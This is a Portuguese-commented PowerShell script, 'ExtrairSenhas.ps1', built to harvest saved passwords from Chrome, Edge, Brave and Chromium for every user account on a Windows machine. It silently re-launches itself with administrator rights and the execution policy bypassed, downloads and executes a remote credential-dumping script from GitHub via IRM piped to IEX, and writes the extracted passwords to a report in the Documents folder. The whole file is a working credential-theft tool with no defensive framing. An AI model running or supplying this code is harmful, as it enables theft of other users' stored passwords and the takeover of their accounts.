# ExtrairSenhas.ps1 - Varre TODOS os usuários e navegadores Chromium

# Força a execução como administrador
if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

# Define a pasta Documents para salvar o relatório
$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
if (-not (Test-Path $pastaDocuments)) {
    $pastaDocuments = Join-Path $env:USERPROFILE "Documents"
}

$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_completo_$datahora.txt"

# Cabeçalho do relatório
$relatorio = @"
========================================
RELATÓRIO COMPLETO DE SENHAS
Data: $(Get-Date -Format "dd/MM/yyyy HH:mm:ss")
Computador: $env:COMPUTERNAME
========================================

"@

$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Carrega o script do GitHub
$null = IRM 'https://raw.githubusercontent.com/The-Viper-One/Invoke-PowerChrome/refs/heads/main/Invoke-PowerChrome.ps1' | IEX

# Lista de navegadores para verificar
$navegadores = @(
    @{Nome="Chrome"; Caminho="Google\Chrome\User Data"},
    @{Nome="Edge"; Caminho="Microsoft\Edge\User Data"},
    @{Nome="Brave"; Caminho="BraveSoftware\Brave-Browser\User Data"},
    @{Nome="Chromium"; Caminho="Chromium\User Data"}
)

# Lista de usuários do Windows
$usuarios = Get-ChildItem "C:\Users" -Directory | Where-Object { $_.Name -notin @("Public", "Default", "Default User") }

foreach ($usuario in $usuarios) {
    $userName = $usuario.Name
    $userPath = $usuario.FullName
    $appDataLocal = Join-Path $userPath "AppData\Local"
    
    Write-Host "Verificando usuario: $userName" -ForegroundColor Cyan
    
    $relatorio += "`n========================================`n"
    $relatorio += "USUÁRIO: $userName`n"
    $relatorio += "========================================`n"
    
    foreach ($nav in $navegadores) {
        $loginDataPath = Join-Path $appDataLocal "$($nav.Caminho)\Default\Login Data"
        
        if (Test-Path $loginDataPath) {
            Write-Host "  [+] Encontrado $($nav.Nome) em $userName" -ForegroundColor Green
            $relatorio += "`n--- $($nav.Nome) ---`n"
            
            # Tenta extrair as senhas
            try {
                # Copia o arquivo para temporário (evita bloqueio)
                $tempDb = Join-Path $env:TEMP "temp_${userName}_${nav.Nome}.db"
                Copy-Item $loginDataPath $tempDb -Force -ErrorAction SilentlyContinue
                
                # Executa a extração para este navegador
                $output = Invoke-PowerChrome -Browser $($nav.Nome.ToLower()) 2>&1
                $relatorio += $output
                $relatorio += "`n"
                
                # Limpa arquivo temporário
                Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
            }
            catch {
                $relatorio += "Erro ao extrair: $($_.Exception.Message)`n"
            }
        }
        else {
            Write-Host "  [-] $($nav.Nome) nao encontrado em $userName" -ForegroundColor DarkGray
        }
    }
}

# Adiciona rodapé
$relatorio += "`n========================================`n"
$relatorio += "FIM DO RELATÓRIO`n"
$relatorio += "Gerado em: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')`n"
$relatorio += "========================================`n"

# Salva o relatório final
$relatorio | Out-File -FilePath $arquivoSaida -Encoding UTF8

# Verifica se salvou corretamente
if (Test-Path $arquivoSaida) {
    $tamanho = [math]::Round((Get-Item $arquivoSaida).Length / 1KB, 2)
    Write-Host "`n===================================================" -ForegroundColor Green
    Write-Host "SUCESSO! Relatorio salvo em: $arquivoSaida" -ForegroundColor Green
    Write-Host "Tamanho: $tamanho KB" -ForegroundColor Cyan
    Write-Host "===================================================" -ForegroundColor Green
}

exit
